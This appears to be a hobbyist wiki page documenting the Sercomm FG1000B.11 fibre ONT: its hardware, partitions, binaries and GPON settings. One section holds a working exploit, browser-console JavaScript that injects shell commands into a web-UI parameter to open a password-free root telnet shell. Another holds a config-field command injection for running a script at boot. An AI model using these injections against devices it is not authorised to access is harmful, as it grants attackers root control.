---
title: Sercomm FG1000B.11
has_children: false
layout: default
parent: Sercomm
---

# Hardware Specifications

|                 |                        |
| --------------- | ---------------------- |
| Vendor/Brand    | Sercomm                |
| Model           | FG1000B.11             |
| ODM             | ✅                     |
| Chipset         | BCM68360_B1            |
| Flash           | NAND 128 MB            |
| RAM             | 256 MB                 |
| CPU             | Broadcom B53 Dual Core |
| CPU Clock       | 1500MHz                |
| Bootloader      | CFE                    |
| Load addr       | 0x80000                |
| 2.5GBaseT       | Yes                    |
| PHY Ethernet    | RTL8221B               |
| Optics          | LC/APC                 |
| IP address      | 192.168.100.1/24       |
| Web Gui         | ✅, no login needed    |
| SSH             | No                     |
| Telnet          | No                     |
| Serial          | ✅, only TX            |
| Serial baud     | 115200                 |
| Serial encoding | 8-N-1                  |
| Form Factor     | ONT                    |


{% include image.html file="fg1000b-11_rear.jpg" alt="Sercomm FG1000B.11" caption="Sercomm FG1000B.11 rear" %}
{% include image.html file="fg1000b-11_bottom.jpg" alt="Sercomm FG1000B.11 bottom" caption="Sercomm FG1000B.11 bottom" %}
{% include image.html file="fg1000b-11_side1.jpg" alt="Sercomm FG1000B.11 side 1" caption="Sercomm FG1000B.11 side 1" %}
{% include image.html file="fg1000b-11_side2.jpg" alt="Sercomm FG1000B.11 side 2" caption="Sercomm FG1000B.11 side 2" %}

## Serial

See side2 picture for pin identification, use 112500 8-N-1
The ONT seems to only display output of the ROM CFE and flash CFE, but doesn't seem to allow interrupting the boot.

{% include serial_dump.html file="fg1000b-11_boot_cfe.txt" alt="Sercomm FG1000B.11 CFE boot dump" title="Sercomm FG1000B.11 CFE boot dump" %}

## Root procedure
[See the enable telnet/ssh section](/ont-sercomm-fg1000b-11/#enable-telnetsshserial)

## List of software versions

Currently the only known version is 090144.1.0.001

## List of partitions
`cat /proc/mtd`

| dev:   | size     | erasesize | name                 |
| ------ | -------- | --------- | -------------------- |
| mtd0:  | 00200000 | 00020000  | "CfeROM              |
| mtd1:  | 00400000 | 00020000  | "CfeRAM1             |
| mtd2:  | 00400000 | 00020000  | "CfeRAM2             |
| mtd3:  | 000a0000 | 00020000  | "FlashMAP            |
| mtd4:  | 000a0000 | 00020000  | "SN                  |
| mtd5:  | 00140000 | 00020000  | "Protect             |
| mtd6:  | 01b80000 | 00020000  | "Rootfs1             |
| mtd7:  | 00c80000 | 00020000  | "Lib1                |
| mtd8:  | 01b80000 | 00020000  | "Rootfs2             |
| mtd9:  | 00c80000 | 00020000  | "Lib2                |
| mtd10: | 000a0000 | 00020000  | "Bootflg             |
| mtd11: | 000a0000 | 00020000  | "Rootfs1_Info        |
| mtd12: | 000a0000 | 00020000  | "Lib1_Info           |
| mtd13: | 000a0000 | 00020000  | "Rootfs2_Info        |
| mtd14: | 000a0000 | 00020000  | "Lib2_Info           |
| mtd15: | 00280000 | 00020000  | "XMLConfig           |
| mtd16: | 00280000 | 00020000  | "Erasable_XML_CFG    |
| mtd17: | 00960000 | 00020000  | "AppData             |
| mtd18: | 00140000 | 00020000  | "Yaffs               |
| mtd19: | 010c0000 | 00020000  | "Reserve             |
| mtd20: | 00930000 | 0001f000  | "rootfs_ubifs        |
| mtd21: | 0029bf98 | 0001f000  | "filestruct_full.bin |
| mtd22: | 003bd000 | 0001f000  | "lib_squashfs        |

# Useful files and binaries

{% include alert.html content="NAND MTD5 mounted as  `/tmp/var_link_dir/ft` contains all serial numbers and the MAC address of the ONT, please consider backing it up before performing any hack, files are: `customer_sn,gpon_sn,hw_version,mac_addr,pcba_sn`" alert="Warning" icon="svg-warning" color="red" %}

{% include alert.html content="Calling the `board_init` binary directly or indirectly (via init script) when the board is already booted will cause NAND mtd 5, 15, 16 & 17 to be erased! 
Please back them up before any hacking! Recovery is possible if you hardware reset the device, enable the telnet and recreate the `customer_sn, gpon_sn, hw_version, mac_addr, pcba_sn` file on the `/tmp/var_link_dir/ft` volume which can be remounted as R/W `mount -o remount,rw /dev/mtdblock5 /tmp/var_link_dir/ft`." alert="Warning" icon="svg-warning" color="red" %}

## Useful files
* `/etc/framework_init.sh` - is the main entry for the launch of the Sercomm framework by `/etc/rcS`

## Useful binaries
* `pb_ap` - monitors the `reset button`. If the button is pushed for longer than 10s it resets the ONT to factory default, otherwise it only reboots the device - Run at startup - no args

* `fw_image_ctl` - allows firmware upgrade, switch between `fw0` & `fw1`,reading firmware info, replicating between fw, deactivating image etc... - Options listed when called with no args

* `cmld_client`- manipulates the configuration 'DB' stored in /dev/mtd15, its output is in the XML format. The root element is "InternetGatewayDevice". A final '.' dot is needed to list all sub-elements. Example to get the device's full XML config ```cmld_client get_node InternetGatewayDevice.```. Listed elements with `writable="1"` can be changed with `set` and the node path. Elements marked as `dynamic="1"` have their value evaluated at the time you specifically call get on that specific node, `cmld_client get  InternetGatewayDevice.WANDevice.1.X_SC_GponInterfaceConfig.Status` - The daemon is run at startup - options listed when called with no args

* `cmd_agent` - strange daemon launched at startup during `/etc/rcS` that opens a `/tmp/cmd_client` sock file that listens to commands and executes them. - No args

* `statd` - daemon launched at boot which collects monitoring data from the ONT. - No args

* `ubusd` - ubusd is used to send message between processes, current ubus services are `cml,network-manager,smd`

* `smd` - daemon in charge of launching the `/opt/` plugin for each of the ONT's service like: `init, gpon, iptv, temperature, account, http, lan, network, syslog, system`. All is done in code which does not help hacking the device.

# Usage

## Enabling telnet/SSH/serial

The code below can be pasted in the browser's console after opening `http://192.168.100.1` (default ONT's web UI). This will enable telnet as root with no password on the device (same can be done with `/usr/sbin/sshd` binary). The below hack uses an injection on the `eventlog_applog_download.json` page, the commands can be injected in the request body's `applog_select` parameter and they are executed as superadmin (root).
```javascript
// Fetch a non csrf protected page to get a csrf token
await fetch("http://192.168.100.1/setup.cgi?next_file=statusandsupport/status.html").then(function (response) {
	return response.text();
}).then(function (html) {
	//inject the html response into a HTML DOM to parse it
    var el = document.createElement( 'html' );
    el.innerHTML = html;
	//The token is inserted into the first <script> tag of the page
    var es = el.getElementsByTagName( 'script' );
	var aText = es[0].text;
	//Add the csrf token in the document for other requests
    document.csrf_token = aText.match("'(.*)'")[1];
}).catch(function (err) {
	console.warn('Something went wrong.', err);
});

//use the csrf token to activate telnet with no login and a shell

fetch('http://192.168.100.1/data/statussupporteventlog_applog_download.json?_=1686211215966&csrf_token='+document.csrf_token, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
  },
  body: 'applog_select=a;echo "#!/bin/sh" > /tmp/slogin;echo "export PATH=/bin:/sbin:/usr/bin:/usr/sbin" >> /tmp/slogin;echo "/bin/sh" >> /tmp/slogin;/bin/chmod 755 /tmp/slogin;/usr/sbin/telnetd -l /tmp/slogin'
})
.then(res => res.json())
.then(console.log)
```

There is a way to make a script call at boot to ensure telnet or other services start at boot if needed. It uses a hack from libsl_system.so where there is a `system(...)` call using a String from config, string must be <=12 char. The system call is supposed to set set hostname of the device for storage sharing.
In the example below, a `/data/up` shell script would be created (ensure it has execute rights, such as: `chmod 755`).
```
#First we need to add the missing entry
/usr/bin/cmld_client add InternetGatewayDevice.Services.StorageService. 1
#Then inject within the 12 character limit the hostname and a call to our script
/usr/bin/cmld_client set InternetGatewayDevice.Services.StorageService.1.X_SC_NetbiosName='a;/data/up&'
/usr/bin/cmld_client save
```

## Logging configuration
`syslogd` is configured via Config DB config `cmld_client get_node InternetGatewayDevice.X_SC_Management.Syslog.`. This config is read from the libsl_syslog.so plugin of smd daemon, which generates the `/tmp/lxxd/logd.conf` file and starts the daemon with it as parameter.

# GPON ONU status

## Getting the operational status of the ONU
```
/bin/gponctl getState
``` 

## Getting OLT vendor information
```
/usr/sbin/umci_ctl stack get olt_type
```
or
```
/usr/sbin/umci_ctl rg help
```

## Querying a particular OMCI ME
```
/usr/sbin/umci_ctl mib
```

## Getting/Setting Speed LAN Mode

This has been tested on the Telekom Germany Model of the FG1000B.11 and has brought the desired success of increasing 
the pre-configured ethernet port speed (1G) to auto-negotiated 2.5G. This does not survive a reboot though.

```
/bin/ethctl eth0 media-type auto
```

# GPON/OMCI settings

Part of GPON config is done via the misc configuration loaded as first lib by the smd binary, the config can be seen here:
```
/usr/bin/cmld_client get_node InternetGatewayDevice.X_SC_MiscCfg.GPON.
```
Be aware the fields `OmciManageUniMask`, `PretendFwVersion` are initiated in the binary with respective value `01000000`, `0`.

## Getting/Setting ONU GPON Serial Number
Default value: 16 hex chars on the back of the ONT, starts with `53434F4DA`. The default S/N is the Modem-ID on the sticker.
You can test serial and/or ploam combinations using the command provided below. The password is Hex only and can be up to 36 characters long.
```
/bin/gponctl stop
/bin/gponctl setSnPwd --pwd 00-00-0X-XX-XX-XX-XX-XX-XX-XX --sn YY-YY-YY-YY-YY-YY-YY-YY
/bin/gponctl start
```

You can monitor status by running:
```
/bin/gponctl getstate
```

To save the serial number you need to re-mount `/tmp/var_link_dir/ft` as R/W and change the `gpon_sn` file (consider backing up of the folder before ANY action)
```
/bin/mount -o remount,rw /dev/mtdblock5 /tmp/var_link_dir/ft
echo "XXXXXXXXXXXXX" > /tmp/var_link_dir/ft/gpon_sn
/bin/mount -o remount,ro /dev/mtdblock5 /tmp/var_link_dir/ft
/sbin/reboot
```

## Getting/Setting ONU GPON PLOAM password

The PLOAM password can be set directly as text or hex (without `0x`) via the Web interface if shorter than 10 digits, otherwise a POST call to the URL provided below allows passwords longer than 10 digits (max is 36 characters). 
For example a 20-digit long hex password can be set with these commands:

```
curl -i -s -k -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
    -d $'ploam_password=00000XXXXXXXXXXXXXXX' \
    $'http://192.168.100.1/ONT/client/data/Router.json'
```

Or via the CLI with:
```
/usr/bin/cmld_client set InternetGatewayDevice.WANDevice.1.X_SC_GponInterfaceConfig.X_SC_Password=00000XXXXXXXXXXXXXXX
/usr/bin/cmld_client save
```

## Getting/Setting ONU GPON LOID and LOID password
{% include alert.html content="Not tested but seems to be used by the misc config at smd init" alert="Warning" icon="svg-warning" color="red" %}

```
/usr/bin/cmld_client set InternetGatewayDevice.X_SC_MiscCfg.GPON.LoIdPassword=

/usr/bin/cmld_client set InternetGatewayDevice.X_SC_MiscCfg.GPON.LoId=
```

## Getting/Setting OMCI software version (ME 7)
{% include alert.html content="`get` works, `set` is not tested but seems to be used by the misc config at smd init" alert="Warning" icon="svg-warning" color="red" %}

```
/usr/bin/cmld_client get InternetGatewayDevice.X_SC_MiscCfg.GPON.OmciVersion
```
or via umci_ctl get/set tool (if the config overwrite OMCI or the other way around has not been tested)
```
/usr/sbin/umci_ctl mib get 7
```

## Getting/Setting OMCI hardware version (ME 256)
Default value: `Glasfaser.DTV1`
```
/bin/mount -o remount,rw /dev/mtdblock5 /tmp/var_link_dir/ft
echo "XXXXXXXXXXXXX" > /tmp/var_link_dir/ft/hw_version
/bin/mount -o remount,ro /dev/mtdblock5 /tmp/var_link_dir/ft
reboot
```
## Getting/Setting OMCI vendor ID (ME 256)
Default value: `53434F4D`
{% include alert.html content="The `set` command is available for `Class_id`, `Entity_id`, `Index` and `Value` parameters, but has not been tested." alert="Warning" icon="svg-warning" color="red" %}

```
/usr/sbin/umci_ctl mib get 256
```

## Getting/Setting OMCI equipment ID (ME 257)
{% include alert.html content=" The `set` command is available for `Class_id`, `Entity_id`, `Index` and `Value` parameters, but has not been tested." alert="Warning" icon="svg-warning" color="red" %}

```
/usr/sbin/umci_ctl mib get 257
```

# Advanced settings

## Transferring files to the stick
Since neither `netcat`/`nc` nor `ftp`/`sftp`/`ftps` are available, the best option is to use `curl` to download files from a webserver on your network over HTTP only.
Additionaly a full version of `busybox` for ARM can be added in the /data partition and then use `nc` to pipe data in and out of the device.

## Backup of all partitions
`dd` can be used, as it is available on the device/default busybox to backup the efull nand via `/dev/mtd`

## Checking the currently active image
```
/usr/sbin/fw_ctl -s
```
The output includes a `current running fw` line.

## Booting to a different image
```
/usr/sbin/fw_ctl -c X
```
Where `X` is <0|1|3> and sets commit image; 3 commits current firmware.

## Cloning of image 0 into image 1
```
/usr/sbin/fw_ctl -r XXXX
```
Where `XXX` is <fw|lib> copy type <fw|lib> from current firmware to backup firmware.

## Setting management MAC
```
/bin/mount -o remount,rw /dev/mtdblock5 /tmp/var_link_dir/ft
echo "A095XXXXXXXX" > /tmp/var_link_dir/ft/mac_addr
/bin/mount -o remount,ro /dev/mtdblock5 /tmp/var_link_dir/ft
/sbin/reboot
```
The format is 12 hex digit without any `0x` or `:`

## Setting management IP
```
/usr/bin/cmld_client set InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceIPAddress=192.168.100.1
/usr/bin/cmld_client save
```

## Rebooting the ONU
Either via the public WebUi `http://192.168.100.1/ONT/client/html/content/config/problem_handling.html?lang=en`,  `Reboot` button or

```
/sbin/reboot
```
# Known Bugs
It seems `cmld_client get` can't return string values longer than 12 characters, even for field types mentioning string length. A walkaround is to use `get_node` on the parent element to get proper value ouput.

# Miscellaneous Links

- [FG1000B.11 - lafibre.info](https://lafibre.info/remplacer-bbox/test-glasfaser-modem-2-telekom-pour-remplacement-ont-2-5gbe-synchro-ok-ipv4-ok/)

# Other brand names

 - 1&1 Glasfaser Modem
 - Telekom Glasfaser Modem 2
 - Vodafone Glasfaser Modem (FG1000B.VF)

# Credits
This whole documentation here was made possible thanks to the time invested into reverse engineering by @hwti and the rest of the folks from the forum mentioned in the links section of this page. Thanks a lot!

